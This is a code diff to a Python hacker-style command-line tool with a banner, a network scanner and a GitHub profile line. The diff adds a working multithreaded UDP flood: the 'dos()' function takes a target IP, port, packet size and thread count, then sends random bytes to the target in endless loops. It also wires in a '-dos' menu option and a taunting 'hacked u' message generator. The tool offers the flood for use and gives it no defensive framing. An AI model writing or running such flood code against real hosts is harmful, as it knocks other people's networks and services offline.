@@ -1,12 +1,14 @@
-import pyfiglet
 import sys
 import socket
 from datetime import datetime
+import time
+current_time = time.strftime("%Y-%m-%d")
 from colorama import Fore
 import socket
+import random
 import sys
+import threading
 import subprocess
-from subprocess import Popen, PIPE
 import os
 import uuid
 import platform
@@ -44,6 +46,9 @@ def start():
 		        ▓▓    ▓▓                          ▓▓    ▓▓      
 		        ▓▓▓▓▓▓▓▓                          ▓▓▓▓▓▓▓▓      
 		''')
+
+	print(Fore.CYAN, 'Date :',current_time)
+
 	print(Fore.YELLOW)
 	a = str(f'''
 Github Profile: https://github.com/FlynnStratton/
@@ -53,7 +58,6 @@ Github Profile: https://github.com/FlynnStratton/
 
 	a = a.replace('None', '')
 	print(a)
-
 	import re
 
 
@@ -116,31 +120,8 @@ Github Profile: https://github.com/FlynnStratton/
 			except:
 				a = (Fore.RED,'[+] There is no wireless interface on the system. Or an error has been found with it')
 
-		
-		elif 'linux' or 'parrot' in ops:
-			import argparse
-			
-
-			def get_args():
-			    parser = argparse.ArgumentParser()
-			    parser.add_argument('-t', '--target', dest='target', help='Target IP Address/Adresses')
-			    options = parser.parse_args()
-
-			    #Check for errors i.e if the user does not specify the target IP Address
-			    #Quit the program if the argument is missing
-			    #While quitting also display an error message
-			    if not options.target:
-				#Code to handle if interface is not specified
-				parser.error("[-] Please specify an IP Address or Addresses, use --help for more info.")
-			    return options
-
-			options = get_args()
-		
-		
 		else:
 			print(Fore.RED, '[+] Your operating system does not support this tool')
-			
-		
 
 
 
@@ -164,6 +145,62 @@ Github Profile: https://github.com/FlynnStratton/
 			print(str(output_byte, "utf-8"))
 
 
+	def dos():
+
+		def random_phrase():
+			ppl = ["Near Shelby", "Sasaki", "sysb1n", "Gr3n0xX", "Quiliarca", "Lucazz Dev", "vl0ne-$", "Xernoboy",
+				   "marreta cabeÃ§a de rato", "S4SUK3"]
+			phrase = ["was here", "is watching you", "knows your name", "knows your location", "hacked NASA",
+					  "hacked FBI",
+					  "hacked u", "is looking 4 u", "is right behind you", "has hype"]
+			return random.choice(ppl) + " " + random.choice(phrase)
+
+		def DoS(ip, port, size, index):
+			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			while True:
+				sock.sendto(random._urandom(size), (ip, port))
+				print(Fore.GREEN, f"THREAD {index} {size} bytes sent to {ip}")
+
+		def main():
+			try:
+				if sys.version_info[0] != 3:
+					print(Fore.RED, "Please use python3")
+					sys.exit()
+
+				IP = input("Enter the target ip: ") if len(sys.argv) < 2 else sys.argv[1]
+				PORT = int(input("Enter the target port: ")) if len(sys.argv) < 3 else int(
+					sys.argv[2])
+				SIZE = int(input("Enter the packet size: ")) if len(sys.argv) < 4 else int(
+					sys.argv[3])
+				COUNT = int(input("Enter how many threads to use: ")) if len(
+					sys.argv) < 5 else int(sys.argv[4])
+
+				if PORT > 65535 or PORT < 1:
+					print(Fore.RED, "Please, choose a port between 1 and 65535")
+					sys.exit(1)
+
+				if SIZE > 65500 or SIZE < 1:
+					print(Fore.RED, "Please, choose a size between 1 and 65500")
+					sys.exit(1)
+
+			except KeyboardInterrupt:
+				print(Fore.LIGHTYELLOW_EX, "Exiting...")
+				sys.exit()
+
+			except Exception as e:
+				print(Fore.RED, f"[ERROR] {e}")
+				sys.exit()
+
+			for i in range(COUNT):
+				try:
+					t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
+					t.start()
+				except Exception as e:
+					print(Fore.RED, f"An error ocurred initializing thread {i}: {e}")
+
+		if __name__ == "__main__":
+			main()
+
 		
 
 
@@ -179,7 +216,13 @@ Github Profile: https://github.com/FlynnStratton/
 			
   Network scanner
 		-ns  |    Network scanner
-		''')
+		
+  Denial Of service 
+  		-dos |    DOS attack (only on network0''')
+		print(Fore.RED, '  		-DOS |    DOS attack from anywhere (coming soon)')
+
+
+
 
 
 	try:
@@ -197,6 +240,9 @@ Github Profile: https://github.com/FlynnStratton/
 
 		elif command == '-ls':
 			lan_scan()
+
+		elif command == '-dos':
+			dos()
 
 
 		else:
